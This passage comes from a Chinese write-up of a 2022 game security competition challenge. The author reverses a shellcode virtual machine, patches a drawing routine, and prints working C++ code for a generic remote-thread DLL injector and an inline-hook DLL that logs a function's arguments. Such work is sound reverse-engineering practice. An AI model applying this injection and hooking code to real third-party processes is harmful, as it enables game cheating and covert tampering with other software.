src="https://https://wechat2rss.xlab.app/img-proxy/?k=e9c5e8dd&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlJ9u212T4sqibpD9dmjzlHSkzQEluYsExawn6aEQhEIdtO0iazibTqffGg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>最后调用 <code style="font-family: SFMono-Regular, Consolas, ;">shellcode+0x650</code> 的代码作为入口，下面可以尝试跟一下这个函数，这里可以采用静态修改代码为真实代码，也可以动调执行到这里的时候反编译。</p><p>直接跟到入口，可以很明显地发现函数入口往后有一段对自身的调用</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=8bf949e4&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlqjqrVo29wvq3I8gloqxvMWKhoCvOsCGbfmAhYvqkRlke0OT9Jbph0w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>看地址是 <code style="font-family: SFMono-Regular, Consolas, ;">shellcode+0x420</code>，跟过去，重建函数，是一个很标准的虚拟机流程</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=2e4cea00&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlPnVIcSpIiaZrNJmTbcpKEudpmBibZxicKcP1rY0d2t1GB28cH9r4u6p0g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>虚拟机的代码存在于 <code style="font-family: SFMono-Regular, Consolas, ;">shellcode+0x1301</code> 的地址，也就是第二次拷贝得到的代码。</p><p>根据自己的理解还原了一下虚拟机的流程：</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=3cc70dde&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlFeawvHqP7nS7fE2WOQCuRUHCzUuia5xUwr3SIDAL1nJCt8wNwYia2WkQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><ul><li style="margin-left: 2px;"><p>op0：Stack[0]+=Stack[1]</p></li><li style="margin-left: 2px;"><p>op1：Stack[0]-=Stack[1]</p></li><li style="margin-left: 2px;"><p>op2 num1,num2：Stack[num2]=Stack[num1]</p></li><li style="margin-left: 2px;"><p>op3 num1,num2：Stack[num2]=num1</p></li><li style="margin-left: 2px;"><p>op4 num：这里的操作很神奇，会把栈中第一个值赋值为 <code style="font-family: SFMono-Regular, Consolas, ;">num^'ACE'</code>，第二个值赋值为一个很复杂的运算。</p></li><li style="margin-left: 2px;"><p>op5：调用 shellcode 头部的函数。</p></li><li style="margin-left: 2px;"><p>op6：调用 shellcode 头部的函数，与上一个唯一的区别是第五个参数。</p></li><li style="margin-left: 2px;"><p>op7：退出</p></li></ul><p>而这里的 v16-v18 大概率也是 op2 和 op3 会操作到的，也算栈中的值。</p><p>这里很容易猜测 op5 和 op6 应该是绘制函数的代码。</p><p>FFFF00 刚好是黄色的代码，将取色器放置在程序上也能发现蓝色的代码是 2DDBE7，和这里的颜色代码差了一点，但是可以尝试修改一下。</p><p>CE 找到这个位置，将代码修改一下</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=e5c4207f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlhHxlRhOcHibFooo8sCVlSPa94tzgIbGILlkfjdXyia8ibibJlkHlibGetOw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>这里我直接把它改成 000000 也就是黑色，直接跳出来。</p><p>然后执行完下面的代码，发现输出变成黑色了</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=4d54d907&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRl0azdla6icPbkS6R2yHllBQLekCEgLIXMFqhGaqptiaSdsvL2M2ZfuZ5g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>那么主要肯定是要分析 <code style="font-family: SFMono-Regular, Consolas, ;">shellcode+0</code> 处的函数代码了（看不懂直接放弃）。</p><p>虽然看不懂，但是已经知道里面传的一个值是颜色了，去分析分析其他参数的含义就可以了。这里最好的一个办法应该是 hook，去打印它的参数，为了方便可以把它限时输出这点 PATCH 了。</p><p>这个直接去找到它的跳转让它永远跳转或者永远不跳转就行了，这里是改成永远跳转，90 加前面，偏移可以不用动。</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=0a7e976a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRljiaDSOVjpoROQekhviaRzSYHe6ibZMA98ibwyk7raR6SHBkGHiaZrrAlotg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>写一个 DLL 去做 HOOK，主要去 HOOK shellcode，这个地址通过全局变量可以获得（2022游戏安全技术竞赛初赛.exe+0x8308）。</p><p>64 位的程序hook一般直接用 <code style="font-family: SFMono-Regular, Consolas, ;">inline</code> 或者 <code style="font-family: SFMono-Regular, Consolas, ;">hotfix</code> 或者无痕，个人感觉 <code style="font-family: SFMono-Regular, Consolas, ;">hotfix</code> 实现起来简单，但是个人更喜欢 <code style="font-family: SFMono-Regular, Consolas, ;">inline hook</code>，因为它 <code style="font-family: SFMono-Regular, Consolas, ;">windows</code> 消息的机制，会不停地打印数据，因此加全局变量限制输出前 100 次调用的结果。</p><p>注入器（基本通用的）：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;windows.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;iostream&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;time.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;stdlib.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;TlHelp32.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">define</span> EXEFILEW <span style="color: rgb(168, 255, 96);">L"2022游戏安全技术竞赛初赛.exe"</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">define</span> EXEFILE <span style="color: rgb(168, 255, 96);">"2022游戏安全技术竞赛初赛.exe"</span></span><br />DWORD old;<br />SIZE_T written;<br />DWORD <span style="color: rgb(255, 255, 182);">FindProcess</span>() {<br />    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span style="color: rgb(255, 115, 253);">0</span>);<br />    PROCESSENTRY32 pe32;<br />    pe32 = { sizeof(pe32) };<br />    BOOL ret = Process32First(hSnap, &amp;pe32);<br />    <span style="color: rgb(150, 203, 254);">while</span> (ret)<br />    {<br />        <span style="color: rgb(150, 203, 254);">if</span> (!wcsncmp(pe32.szExeFile,  EXEFILEW, lstrlen(EXEFILEW))) {<br />            printf(<span style="color: rgb(168, 255, 96);">"找到程序 %s ,PID=%d\n"</span>, EXEFILE, pe32.th32ProcessID);<br />            <span style="color: rgb(150, 203, 254);">return</span> pe32.th32ProcessID;<br />        }<br />        ret = Process32Next(hSnap, &amp;pe32);<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />}<br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">InjectModule</span>(DWORD ProcessId, <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">char</span>* szPath)<br />{<br />    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);<br />    printf(<span style="color: rgb(168, 255, 96);">"进程句柄:%p\n"</span>, hProcess);<br />    LPVOID lpAddress = VirtualAllocEx(hProcess, <span style="color: rgb(198, 197, 254);">NULL</span>, <span style="color: rgb(255, 115, 253);">0x100</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br />    SIZE_T dwWriteLength = <span style="color: rgb(255, 115, 253);">0</span>;<br />    WriteProcessMemory(hProcess, lpAddress, szPath, strlen(szPath), &amp;dwWriteLength);<br />    HANDLE hThread = CreateRemoteThread(hProcess, <span style="color: rgb(198, 197, 254);">NULL</span>, <span style="color: rgb(198, 197, 254);">NULL</span>, (LPTHREAD_START_ROUTINE)LoadLibraryA, lpAddress, <span style="color: rgb(198, 197, 254);">NULL</span>, <span style="color: rgb(198, 197, 254);">NULL</span>);<br />    WaitForSingleObject(hThread, <span style="color: rgb(255, 115, 253);">-1</span>);<br />    VirtualFreeEx(hProcess, lpAddress, <span style="color: rgb(255, 115, 253);">0</span>, MEM_RELEASE);<br />    CloseHandle(hProcess);<br />    CloseHandle(hThread);<br />}<br /><span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">main</span>() {<br />    DWORD ProcessId = FindProcess();<br />    <span style="color: rgb(150, 203, 254);">while</span> (!ProcessId) {<br />        printf(<span style="color: rgb(168, 255, 96);">"未找到%s程序，等待两秒中再试\n"</span>,EXEFILE);<br />        Sleep(<span style="color: rgb(255, 115, 253);">2000</span>);<br />        ProcessId = FindProcess();<br />    }<br />    InjectModule(ProcessId, <span style="color: rgb(168, 255, 96);">"C:\\Users\\xia0ji233\\source\\repos\\T2022Pre\\x64\\Debug\\hack.dll"</span>);<br />}</code></pre><p>用于 HOOK 的 DLL：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">"pch.h"</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;Windows.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;stdio.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;math.h&gt;</span></span><br /><span style="color: rgb(150, 203, 254);">typedef</span> __int64 (*Func)(<span style="color: rgb(255, 255, 182);">int</span> a1, <span style="color: rgb(255, 255, 182);">int</span> a2, <span style="color: rgb(255, 255, 182);">int</span> a3, <span style="color: rgb(255, 255, 182);">int</span> a4, <span style="color: rgb(255, 255, 182);">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10);<br />__int64 <span style="color: rgb(255, 255, 182);">GetBaseAddr</span>() {<br />    HMODULE hMode = GetModuleHandle(<span style="color: rgb(198, 197, 254);">nullptr</span>);<br />    <span style="color: rgb(150, 203, 254);">return</span> (__int64)hMode;<br />}<br /><span style="color: rgb(255, 255, 182);">void</span>* shellcode = <span style="color: rgb(255, 115, 253);">0</span>;<br />BYTE HookCode[] = {<br />    <span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0xB8</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,  <span style="color: rgb(124, 124, 124);">//mov rax,xxx</span><br />    <span style="color: rgb(255, 115, 253);">0xFF</span>,<span style="color: rgb(255, 115, 253);">0xE0</span>                                           <span style="color: rgb(124, 124, 124);">//jmp rax </span><br />};<br />BYTE OriginCode[<span style="color: rgb(255, 115, 253);">0x50</span>];<br /><span style="color: rgb(255, 255, 182);">size_t</span> HookLen = <span style="color: rgb(255, 115, 253);">12</span>;<br />__int64 times = <span style="color: rgb(255, 115, 253);">100</span>;<br />__int64 <span style="color: rgb(255, 255, 182);">HackShellcode</span>(<span style="color: rgb(255, 255, 182);">int</span> a1, <span style="color: rgb(255, 255, 182);">int</span> a2, <span style="color: rgb(255, 255, 182);">int</span> a3, <span style="color: rgb(255, 255, 182);">int</span> a4, <span style="color: rgb(255, 255, 182);">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10) {<br />    memcpy(shellcode, OriginCode,HookLen);              <span style="color: rgb(124, 124, 124);">//unhook</span><br />    <span style="color: rgb(124, 124, 124);">//</span><br />    <span style="color: rgb(255, 255, 182);">int</span> x = a1, y = a2;<br />    __int64 ret=(*(Func)shellcode)(x, y, a3, a4, <span style="color: rgb(255, 115, 253);">0xFFFF0000</span>, a6, a7, a8, a9, a10);<br />    times--;<br />    <span style="color: rgb(150, 203, 254);">if</span> (times&gt;<span style="color: rgb(255, 115, 253);">0</span>) {<br />        printf(<span style="color: rgb(168, 255, 96);">"call shellcode(%d,%d,%d,%d,%d,%p,%p,%p,%p,%p)\n"</span>,x, y, a3, a4, a5, a6, a7, a8, a9, a10);          <br /><br />    }<br />    memcpy(shellcode, HookCode, HookLen);               <span style="color: rgb(124, 124, 124);">//rehook</span><br />    <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}<br /><br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">HookShellcode</span>() {<br />    __int64 base = GetBaseAddr();<br />    __int64 Ptr = base + <span style="color: rgb(255, 115, 253);">0x8308</span>;<br /><br />    shellcode = (<span style="color: rgb(255, 255, 182);">void</span>*)(*(__int64*)Ptr);<br />    <span style="color: rgb(150, 203, 254);">while</span> (!shellcode) {<br />        shellcode = (<span style="color: rgb(255, 255, 182);">void</span>*)(*(__int64*)Ptr);<br />        printf(<span style="color: rgb(168, 255, 96);">"Find shellcode Fail\n"</span>);<br />        Sleep(<span style="color: rgb(255, 115, 253);">200</span>);<br />    }<br />    printf(<span style="color: rgb(168, 255, 96);">"shellcode addr=%p\n"</span>, shellcode);<br />    memcpy(OriginCode, shellcode,HookLen);              <span style="color: rgb(124, 124, 124);">//saved</span><br />    Func FuncPtr = HackShellcode;<br />    *(__int64*)(HookCode + <span style="color: rgb(255, 115, 253);">2</span>) = (__int64)FuncPtr;       <span style="color: rgb(124, 124, 124);">//construct</span><br />    memcpy(shellcode, HookCode, HookLen);               <span style="color: rgb(124, 124, 124);">//hook</span><br /><br />}<br /><br />BOOL APIENTRY <span style="color: rgb(255, 255, 182);">DllMain</span>( HMODULE hModule,<br />                      DWORD  ul_reason_for_call,<br />                      LPVOID lpReserved<br />                     )<br />{<br />    <span style="color: rgb(150, 203, 254);">switch</span> (ul_reason_for_call)<br />    {<br />        <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_ATTACH:<br />            AllocConsole();<br />            freopen(<span style="color: rgb(168, 255, 96);">"CONOUT$"</span>, <span style="color: rgb(168, 255, 96);">"w"</span>, stdout);<br />            HookShellcode();<br />        <span style="color: rgb(150, 203, 254);">case</span> DLL_THREAD_ATTACH:<br />        <span style="color: rgb(150, 203, 254);">case</span> DLL_THREAD_DETACH:<br />        <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_DETACH:<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> TRUE;<br />}</code></pre><p>首先是为了输出方便创建一个终端定向标准输出，然后 IO 函数就能往终端打印了。</p><p>hook 其实就是覆盖函数头，劫持到自己的函数里面，打印出参数之后把钩子去掉，恢复回原来的样子，再去正常调用，调用结束之后重新挂回钩子，要实现输出前100条的话最后不要重新挂钩子就行。</p><p>结果（PS：输出是正常的，但是我强制都改成黄色绘制了）：</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=13065c5b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlibnPVtt0OkukUw48ouSicxUPyGAZ8EymbErGOCdseqia94n5WnfUXO5SQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>因为前几个参数是 <code style="font-family: SFMono-Regular, Consolas, ;">__int32</code> 类型的，所以直接换 <code style="font-family: SFMono-Regular, Consolas, ;">%d</code> 打印一下，这里放一下部分的数据：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">shellcode </span><span style="color: rgb(150, 203, 254);">addr=000001C5654B0000<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(-950,50,-14703700,1248208,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(50,-390,1822057,-1524539,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(-950,170,-7425437,14227863,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(50,230,1897472,15215384,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(-950,-210,3743658,7267794,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(50,350,966258,14122466,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(-890,-270,463184,7666472,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(170,-270,-2474473,12856971,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(-770,230,3460907,-13492529,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(110,-390,-5989351,14280177,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(-830,170,-3514649,12856715,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(650,50,15384343,11002795,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(590,110,12856715,13307703,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(530,170,14096303,2054931,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(470,230,12869865,15314261,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(410,290,13085065,12188981,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(470,290,11235584,6581496,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(530,290,12847529,3263901,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(710,50,14122635,3090291,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(770,50,14265601,10052917,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(830,50,3793238,14305830,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(710,110,1253500,3434568,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(770,170,13177867,745383,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span></code></pre><p>可以发现，前两个参数应该是坐标（我猜的），但是出现了负值，也就是打印到了屏幕外面，而且都是黄色的点会出现这种情况，导致了 <code style="font-family: SFMono-Regular, Consolas, ;">FLAG</code> 打印不出来，因此尝试在 hook 层面修复这个 bug，把所有的负值翻转，但是发现并没什么用，说明bug应该不止那么简单，还得再分析分析。</p><p>首先就是想看看它一轮有多少个点，直接建个 <code style="font-family: SFMono-Regular, Consolas, ;">set</code> 去输出就行，把所有点保存下来。</p><p>DLL代码：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">"pch.h"</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;Windows.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;set&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;stdio.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;math.h&gt;</span></span><br />std::set&lt;std::pair&lt;<span style="color: rgb(255, 255, 182);">int</span>, <span style="color: rgb(255, 255, 182);">int</span>&gt;&gt;s;<br /><br /><span style="color: rgb(150, 203, 254);">typedef</span> __int64 (*Func)(<span style="color: rgb(255, 255, 182);">int</span> a1, <span style="color: rgb(255, 255, 182);">int</span> a2, <span style="color: rgb(255, 255, 182);">int</span> a3, <span style="color: rgb(255, 255, 182);">int</span> a4, <span style="color: rgb(255, 255, 182);">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10);<br />__int64 <span style="color: rgb(255, 255, 182);">GetBaseAddr</span>() {<br />    HMODULE hMode = GetModuleHandle(<span style="color: rgb(198, 197, 254);">nullptr</span>);<br />    <span style="color: rgb(150, 203, 254);">return</span> (__int64)hMode;<br />}<br /><span style="color: rgb(255, 255, 182);">void</span>* shellcode = <span style="color: rgb(255, 115, 253);">0</span>;<br />BYTE HookCode[] = {<br />    <span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0xB8</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,  <span style="color: rgb(124, 124, 124);">//mov rax,xxx</span><br />    <span style="color: rgb(255, 115, 253);">0xFF</span>,<span style="color: rgb(255, 115, 253);">0xE0</span>                                           <span style="color: rgb(124, 124, 124);">//jmp rax </span><br />};<br />BYTE OriginCode[<span style="color: rgb(255, 115, 253);">0x50</span>];<br /><span style="color: rgb(255, 255, 182);">size_t</span> HookLen = <span style="color: rgb(255, 115, 253);">12</span>;<br />__int64 times = <span style="color: rgb(255, 115, 253);">100</span>;<br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">printset</span>() {<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">auto</span> k : s) {<br />        printf(<span style="color: rgb(168, 255, 96);">"(%d,%d)\n"</span>, k.first, k.second);<br />    }<br />}<br />__int64 <span style="color: rgb(255, 255, 182);">HackShellcode</span>(<span style="color: rgb(255, 255, 182);">int</span> a1, <span style="color: rgb(255, 255, 182);">int</span> a2, <span style="color: rgb(255, 255, 182);">int</span> a3, <span style="color: rgb(255, 255, 182);">int</span> a4, <span style="color: rgb(255, 255, 182);">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10) {<br />    <span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">int</span> flag = <span style="color: rgb(255, 115, 253);">1</span>;<br />    memcpy(shellcode, OriginCode,HookLen);              <span style="color: rgb(124, 124, 124);">//unhook</span><br />    <span style="color: rgb(124, 124, 124);">//</span><br />    <span style="color: rgb(255, 255, 182);">int</span> x = a1, y = a2;<br />    __int64 ret=(*(Func)shellcode)(x, y, a3, a4, a5, a6, a7, a8, a9, a10);<br />    times--;<br />    <span style="color: rgb(150, 203, 254);">if</span> (times&gt;<span style="color: rgb(255, 115, 253);">0</span>) {<br />        printf(<span style="color: rgb(168, 255, 96);">"call shellcode(%d,%d,%d,%d,%x,%p,%p,%p,%p,%p)\n"</span>,x, y, a3, a4, a5, a6, a7, a8, a9, a10);          <br />    }<br />    <span style="color: rgb(255, 255, 182);">int</span> presize = s.size();<br />    s.insert({ x,y });<br />    <span style="color: rgb(150, 203, 254);">if</span> (s.size() == presize) {<br />        <span style="color: rgb(150, 203, 254);">if</span> (flag) {<br />            printset();<br />            flag = <span style="color: rgb(255, 115, 253);">0</span>;<br />        }<br />    }<br />    memcpy(shellcode, HookCode, HookLen);               <span style="color: rgb(124, 124, 124);">//rehook</span><br />    <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}<br /><br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">HookShellcode</span>() {<br />    __int64 base = GetBaseAddr();<br />    